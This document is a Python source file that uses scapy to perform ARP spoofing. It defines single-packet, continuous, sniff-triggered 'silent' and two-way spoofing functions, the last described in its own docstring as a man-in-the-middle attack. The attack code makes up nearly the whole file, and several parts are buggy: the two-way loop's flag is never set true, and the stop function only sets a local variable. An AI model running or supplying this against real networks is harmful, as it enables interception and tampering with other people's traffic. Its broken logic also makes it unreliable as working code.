from scapy.all import *
from scapy.all import ARP
import threading
import time

two_way_active = False
class arp:
    def send_spoof_packet(target_ip, spoofed_ip):
        """
        Send a spoofing packet
        """
        packet = ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
        send(packet, verbose=False)

    def continuous_arp_spoof(target_ip, spoofed_ip, interval):
        """
        start a loop that continuously sends spoofing packets, interval in seconds
        """
        def spoof_thread(target_ip, spoofed_ip, interval):
            packet = ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
            send(packet, inter=interval, loop=True)
        try:
            print("starting contiuous arp spoof from %s to %s with interval %d seconds" % (target_ip, spoofed_ip, interval))
            thread = threading.Thread(target=spoof_thread, args=(target_ip, spoofed_ip, interval))
            thread.daemon = True
            thread.start()
        except KeyboardInterrupt:
            print("stopping continuous ARP spoofing")

    def silent_arp_spoof(target_ip, spoofed_ip):
        """
        Start the silent arp spoofing
        """
        print("starting silent arp spoof of %s to %s" % (target_ip, spoofed_ip))

        def handle_arp_packet(packet):
            if packet.haslayer(ARP) and packet[ARP].op == 1:
                if packet[ARP].psrc == target_ip and packet[ARP].pdst == spoofed_ip:
                    print("got arp request from %s to %s}" % (target_ip, spoofed_ip))
                    arp.send_spoof_packet(target_ip, spoofed_ip)
                    print("Send spoofed packet: %s is at %s" % (spoofed_ip, get_if_hwaddr()))
                elif packet[ARP].psrc == spoofed_ip and packet[ARP].pdst == target_ip:
                    print("caught arp request from %s to %s, ignoring" % ({spoofed_ip}, target_ip))

        try:
            sniff(filter="arp", prn=handle_arp_packet, store=0)
        except KeyboardInterrupt:
            print("Stopping silent ARP spoofing")

    def two_way_arp_spoof(ip1, ip2, interval):
        """
        Start a two way ARP spoof for MITM atack
        """
        
        def spoof_thread(ip1, ip2, interval):
            while two_way_active:
                arp.send_spoof_packet(ip1, ip2)
                arp.send_spoof_packet(ip2, ip1)
                time.sleep(interval)
        
        thread = threading.Thread(target=spoof_thread, args=(ip1, ip2, interval))
        thread.daemon = True
        thread.start()
        
        return thread
        
    def stop_two_way_spoof():
        two_way_active = False
        